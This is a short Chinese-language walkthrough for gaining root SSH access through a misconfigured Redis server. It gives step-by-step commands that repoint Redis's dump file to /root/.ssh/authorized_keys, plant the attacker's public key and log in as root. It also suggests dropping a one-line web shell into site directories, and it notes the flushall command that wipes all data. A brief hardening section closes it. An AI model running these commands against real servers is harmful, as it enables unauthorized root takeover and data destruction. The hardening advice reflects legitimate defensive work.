# redis获取ssh免密码登录权限

> 前提：redis是以root权限运行
> 
> 无root权限也可以尝试往常用网站目录写入一句话木马

## 利用
- 建立tcp连接

  `nc`可用`telnet`or`netcat`替代

```bash
nc 127.0.0.1 port
```

- 弱口令情况下(未授权不用)

```
auth 密码
```

- 设置写入路径与文件名称

```
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
```

- 找一个不在使用的数据库，不对目标数据造成影响

  redis数据库取值范围：0-15

```
select 15
```
执行`keys *`，出现`*0`则代表里面没有数据，`flushall`可清空数据库所有数据


- 将自己的公钥`~/.ssh/id_rsa.pub`配置到目标服务器

  命令格式：set 【键】【值】

```
set "abc" "ssh-rsa AAAAB3NzaC1y........"
```

- 持久化保存

```
save
exit
```

- 尝试登录目标服务器

```
ssh root@121.198.1.2 -p22
```

## 修复方法
- 设置复杂密码
- 修改redis.conf,只对内网服务,或修改默认端口
```redis.conf
bind 127.0.0.1
Port 19898
```
- 修改redis.conf, 重命名高危命令

```redis.conf
rename-command EVAL ""
rename-command CONFIG ""
rename-command FLUSHALL ""
```

重启redis

- 低权限运行

```bash
groupadd -r redis && useradd -r -g redis redis
```

